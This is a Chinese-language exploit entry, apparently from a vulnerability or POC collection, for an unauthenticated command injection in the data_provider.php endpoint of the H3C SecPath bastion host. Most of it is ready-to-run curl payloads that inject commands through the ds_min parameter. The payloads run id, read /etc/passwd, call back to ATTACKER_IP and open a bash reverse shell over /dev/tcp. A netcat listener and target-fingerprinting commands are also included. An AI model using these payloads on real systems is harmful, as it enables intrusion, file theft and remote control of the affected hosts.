---
id: H3C-SECPATH-RCE
title: H3C SecPath 堡垒机 data_provider.php 远程命令执行漏洞
product: h3c
vendor: H3C
version_affected: "H3C SecPath 运维审计系统（具体版本未公开）"
severity: CRITICAL
tags: [rce, 无需认证, 国产]
fingerprint: ["H3C", "SecPath", "堡垒机"]
---

## 漏洞描述

H3C SecPath 运维审计系统（堡垒机）的 `data_provider.php` 接口在处理日期时间参数时，将用户输入的 `ds_min` 等参数直接拼接到系统命令中执行，未进行过滤和转义，导致未经认证的攻击者可通过分号等字符注入任意系统命令。

## 影响版本

- H3C SecPath 运维审计系统（受影响版本）

## 前置条件

- 无需认证
- 目标 HTTP 端口（默认 80/443）可访问
- `/audit/data_provider.php` 接口可达

## 利用步骤

1. 确认目标为 H3C SecPath 运维审计系统
2. 访问 `/audit/data_provider.php` 接口
3. 在 `ds_min` 参数中通过分号注入系统命令
4. 从 HTTP 响应中获取命令执行结果

## Payload

### 基本命令执行

```bash
curl "http://target/audit/data_provider.php?ds_y=2024&ds_m=01&ds_d=01&ds_hour=00&ds_min=;id;"
```

### 读取敏感文件

```bash
curl "http://target/audit/data_provider.php?ds_y=2024&ds_m=01&ds_d=01&ds_hour=00&ds_min=;cat+/etc/passwd;"
```

### HTTP 回调

```bash
curl "http://target/audit/data_provider.php?ds_y=2024&ds_m=01&ds_d=01&ds_hour=00&ds_min=;curl+http://ATTACKER_IP/callback;"
```

### 反弹 shell

```bash
curl "http://target/audit/data_provider.php?ds_y=2024&ds_m=01&ds_d=01&ds_hour=00&ds_min=;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261';"
```

## 验证方法

```bash
# 检查响应中是否包含命令输出
curl -s "http://target/audit/data_provider.php?ds_y=2024&ds_m=01&ds_d=01&ds_hour=00&ds_min=;id;" | grep "uid="

# HTTP 回调验证
# 攻击者: nc -lvp 80
curl -s "http://target/audit/data_provider.php?ds_y=2024&ds_m=01&ds_d=01&ds_hour=00&ds_min=;curl+http://ATTACKER_IP/callback;"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "H3C\|SecPath\|堡垒机\|运维审计"
curl -s -o /dev/null -w "%{http_code}" "http://target/audit/data_provider.php"
```
